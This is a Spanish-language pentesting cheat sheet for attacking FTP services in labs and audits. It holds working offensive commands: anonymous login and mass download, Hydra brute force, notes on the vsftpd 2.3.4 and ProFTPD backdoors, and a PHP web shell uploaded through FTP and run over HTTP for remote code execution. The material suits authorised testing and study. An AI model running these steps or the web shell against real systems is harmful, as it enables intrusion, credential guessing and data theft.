# Protocolo FTP (File Transfer Protocol)

> **Puerto por defecto:** `21/TCP` (control) · `20/TCP` (datos en modo activo)

FTP es un protocolo para transferir archivos entre cliente y servidor. En auditorías es un objetivo jugoso: puede permitir **acceso anónimo**, exponer archivos sensibles, tener **credenciales débiles** o correr versiones **vulnerables a RCE**.

---

## Enumeración

Lo primero, identifica la versión con Nmap (una versión concreta puede tener un exploit público):

```bash
nmap -p21 -sCV --script="ftp-* and not brute" <IP>
```

### Acceso anónimo

El fallo más común. Prueba el usuario `anonymous` con cualquier contraseña:

```bash
ftp <IP>
# Usuario: anonymous
# Contraseña: (cualquiera, p.ej. anonymous@)
```

O directamente con el cliente no interactivo:

```bash
curl ftp://<IP>/ --user anonymous:anonymous
```

> **Consejo:** si entras como anónimo, descarga TODO para revisarlo offline. A menudo hay backups, configuraciones o credenciales.

---

## Comandos dentro de la sesión FTP

```text
ls              # listar
cd <dir>        # cambiar directorio
binary          # modo binario (IMPRESCINDIBLE para ejecutables/zip/imágenes)
get <archivo>   # descargar uno
mget *          # descargar todos
put <archivo>   # subir (si tienes permiso de escritura)
prompt off      # no preguntar en cada mget/mput
exit
```

> **Nota:** si vas a descargar binarios o comprimidos, activa `binary` primero. En modo ASCII los archivos se corrompen y pierdes horas sin saber por qué.

### Descarga recursiva de todo el servidor

```bash
wget -m --no-passive ftp://anonymous:anonymous@<IP>
```

---

## Fuerza bruta

Solo si tienes un usuario válido o es la vía esperada:

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ftp://<IP>
hydra -L usuarios.txt -P rockyou.txt ftp://<IP> -t 4
```

---

## Explotación por versión vulnerable

```bash
searchsploit <servidor_ftp> <versión>
```

Casos clásicos que aparecen en labs:

| Software / versión | Vulnerabilidad |
| ------------------ | -------------- |
| **vsftpd 2.3.4**   | Backdoor: un usuario acabado en `:)` abre una shell en el puerto `6200`. |
| **ProFTPD 1.3.3c** | Backdoor con RCE. |
| **ProFTPD 1.3.5**  | `mod_copy` (`SITE CPFR`/`CPTO`): copiar archivos arbitrarios → webshell. |

### Subir una webshell vía FTP

Si tienes **escritura** y el FTP sirve el mismo directorio que un servidor web (`/var/www/html`), sube una shell:

```bash
# Crea la shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Súbela
curl -T shell.php ftp://<IP>/ --user usuario:pass
# Ejecútala vía web
curl "http://<IP>/shell.php?cmd=id"
```

---

## FTP sobre TLS (FTPS)

Si el servicio exige cifrado, usa `lftp`:

```bash
lftp -u <usuario>,<pass> <IP>
# dentro: set ssl:verify-certificate no
```

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `ftp` / `lftp` | Clientes FTP interactivos. |
| `curl` / `wget` | Descarga/subida no interactiva y recursiva. |
| `nmap` (`ftp-*`) | Scripts NSE de enumeración FTP. |
| `hydra` | Fuerza bruta de credenciales. |
| `searchsploit` | Exploits por versión. |

---

> **Consejo:** el flujo mental ante un FTP es: **(1)** ¿anónimo? → descárgalo todo; **(2)** ¿qué versión? → `searchsploit`; **(3)** ¿puedo escribir y hay web? → webshell; **(4)** fuerza bruta solo como último recurso. Mira siempre si los archivos del FTP coinciden con la web (puerto 80): esa combinación es un camino directo a RCE.
